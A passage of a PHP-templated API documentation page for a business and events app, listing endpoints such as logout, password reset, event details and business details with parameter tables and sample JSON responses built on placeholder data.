class="property">distance</span>: <span class="type-string">"111.43117397910554"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"100"</span>,</div></li><li><div class="hoverable"><span class="property">images</span>: [ ]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"3"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-3"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"rajkot"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"7878787878"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"212.78204287715442"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"120"</span>,</div></li><li><div class="hoverable"><span class="property">images</span>: [ ]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-4"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"Upleta"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"8989898989"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"291.6479324857863"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"400"</span>,</div></li><li><div class="hoverable"><span class="property">images</span>: [ ]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-5"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"Kutiyana"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"5252525252"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"324.2172363675114"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"785"</span>,</div></li><li><div class="hoverable"><span class="property">images</span>: [ ]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"6"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-6"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"Porbandar"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"7575757575"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"354.29813267932985"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"1210"</span>,</div></li><li><div class="hoverable"><span class="property">images</span>: [ ]</div></li></ul>}</div></li></ul>]</div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div> 

<?php 
    include 'event_attendee.php';
    include 'Comments.php';
    include 'likes.php';
    include 'get_all_events.php';
    include 'get_all_business.php';
?>
<div class="section" id="logout">
    <h2>Logout
        <a class="headerlink" href="index.php#logout" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'logout.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Logout</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'user/sign_out';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
           
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>
        {<span class="ellipsis"></span>
        <ul class="obj collapsible">
            <li>
                <div class="hoverable">
                    <span class="property">code</span>: <span class="type-number">200</span>,
                </div>
            </li>
            <li>
                <div class="hoverable">
                    <span class="property">status</span>: <span class="type-string">"success"</span>,
                </div>
            </li>
             <li>
                <div class="hoverable">
                    <span class="property">message</span>: <span class="type-string">"Logout successfully."</span>,
                </div>
            </li>
           
        </ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>
<hr>
<div class="section" id="forgot_password">
    <h2>Forgot Password
        <a class="headerlink" href="index.php#forgot_password" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'forgot_password.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Forgot Password</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'user/forgot_password';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>email</td>
                <td>Required</td>
                <td></td>
            </tr>
           
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>
        {<span class="ellipsis"></span>
        <ul class="obj collapsible">
            <li>
                <div class="hoverable">
                    <span class="property">code</span>: <span class="type-number">200</span>,
                </div>
            </li>
            <li>
                <div class="hoverable">
                    <span class="property">status</span>: <span class="type-string">"success"</span>,
                </div>
            </li>
             <li>
                <div class="hoverable">
                    <span class="property">message</span>: <span class="type-string">"Check Mail for reset password details."</span>,
                </div>
            </li>
           
        </ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<hr>

<div class="section" id="change_password">
    <h2>Change Password
        <a class="headerlink" href="index.php#change_password" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'change_password.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Change Password</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'user/change_password';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
              <tr class="row-even">
                <td>old_password</td>
                <td>Required</td>
                <td></td>
            </tr>
              <tr class="row-even">
                <td>new_password</td>
                <td>Required</td>
                <td></td>
            </tr>
           
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>
        {<span class="ellipsis"></span>
        <ul class="obj collapsible">
            <li>
                <div class="hoverable">
                    <span class="property">code</span>: <span class="type-number">200</span>,
                </div>
            </li>
            <li>
                <div class="hoverable">
                    <span class="property">status</span>: <span class="type-string">"success"</span>,
                </div>
            </li>
             <li>
                <div class="hoverable">
                    <span class="property">message</span>: <span class="type-string">"Check Mail for reset password details."</span>,
                </div>
            </li>
           
        </ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>




<hr>


<div class="section" id="eventdetail">
    <h2>Event Details
        <a class="headerlink" href="index.php#eventdetail" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'eventdetail.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Event Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'business/event_detail';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>event_id</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLatitude</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLongitude</td>
                <td>Required</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
  <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"3"</span>,</div></li><li><div class="hoverable"><span class="property">title</span>: <span class="type-string">"Stark Expo3"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"rajkot"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"event"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1673.9067740899545"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/event/3.jpg">http://localhost/businessApp/uploads/event/3.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">totalshare</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">totalfavorite</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"9"</span>,</div></li><li><div class="hoverable"><span class="property">venue</span>: <span class="type-string">"Ahmedabad GMDC"</span>,</div></li><li><div class="hoverable"><span class="property">category_id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">Lattitude</span>: <span class="type-string">"22.3039"</span>,</div></li><li><div class="hoverable"><span class="property">Longitude</span>: <span class="type-string">"70.8022"</span>,</div></li><li><div class="hoverable"><span class="property">start_time</span>: <span class="type-string">"2016-08-25 08:53"</span>,</div></li><li><div class="hoverable"><span class="property">end_time</span>: <span class="type-string">"2016-09-25 08:53"</span>,</div></li><li><div class="hoverable"><span class="property">is_user_exits</span>: <span class="type-boolean">false</span>,</div></li><li><div class="hoverable"><span class="property">LoggedinUserDetail</span>: [ ],</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable hovered"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miralbhai"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/user/14691723208605.png">http://localhost/businessApp/uploads/user/14691723208605.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"0"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">attendee</span>: [ ],</div></li><li><div class="hoverable"><span class="property">images</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/event/3.jpg">http://localhost/businessApp/uploads/event/3.jpg</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">CategoryData</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">CategoryImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/business.png">http://localhost/businessApp/uploads/category/business.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">CategoryName</span>: <span class="type-string">"Business"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">CreatedUserData</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"9"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/user/14691720377171.png">http://localhost/businessApp/uploads/user/14691720377171.png</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>}</div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<div class="section" id="businessdetail">
    <h2>Business Details
        <a class="headerlink" href="index.php#businessdetail" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'businessdetail.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Business Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'business/business_detail';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>business_id</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLatitude</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLongitude</td>
                <td>Required</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-1"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">"Mon-Sat  10AM-10PM"</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"1234567890"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"13.480391442981835"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">images</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/3.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/3.jpg</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/4.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/4.jpg</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>}</div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>


<div class="section" id="myevents">
    <h2>My Events
        <a class="headerlink" href="index.php#myevents" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'myevents.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>My events Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'user/my_events';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLatitude</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLongitude</td>
                <td>Required</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
  <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">title</span>: <span class="type-string">"Stark Expo1"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"event"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1611.298316192036"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/event/1.jpg">http://localhost/businessApp/uploads/event/1.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">totalshare</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">totalfavorite</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">venue</span>: <span class="type-string">"Ahmedabad GMDC"</span>,</div></li><li><div class="hoverable"><span class="property">category_id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">Lattitude</span>: <span class="type-string">"23.0225"</span>,</div></li><li><div class="hoverable"><span class="property">Longitude</span>: <span class="type-string">"72.5714"</span>,</div></li><li><div class="hoverable"><span class="property">start_time</span>: <span class="type-string">"2016-08-25 08:53"</span>,</div></li><li><div class="hoverable"><span class="property">end_time</span>: <span class="type-string">"2016-09-25 08:53"</span>,</div></li><li><div class="hoverable"><span class="property">is_user_exits</span>: <span class="type-boolean">true</span>,</div></li><li><div class="hoverable"><span class="property">CreatedUserData</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable hovered"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miralbhai"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/user/14691723208605.png">http://localhost/businessApp/uploads/user/14691723208605.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">is_like</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">is_rated</span>: <span class="type-string">"1"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miralbhai"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/user/14691723208605.png">http://localhost/businessApp/uploads/user/14691723208605.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"1"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/1.jpg">http://localhost/businessApp/1.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"1"</span></div></li></ul>},</div></li><li><div class="hoverable"><div 